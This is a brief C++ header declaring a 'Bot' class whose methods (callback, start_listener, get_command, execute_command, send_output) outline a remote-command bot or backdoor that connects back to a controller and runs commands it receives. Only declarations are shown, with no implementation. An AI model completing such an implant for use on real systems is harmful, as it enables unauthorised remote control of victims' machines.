#include <netinet/in.h>
#pragma once


class Bot {
public:
    Bot(const sockaddr_in* cbaddr);
    int callback();
    int start_listener();
    int get_command();
    int execute_command();
    int send_output();
    int command_handler();
    bool is_connected();

private:
    sockaddr_in m_cbaddr;   // Callback Address
    int m_cmport;           // The Port of the Command Listener
    int m_cmfd;           
    int m_lisfd;
};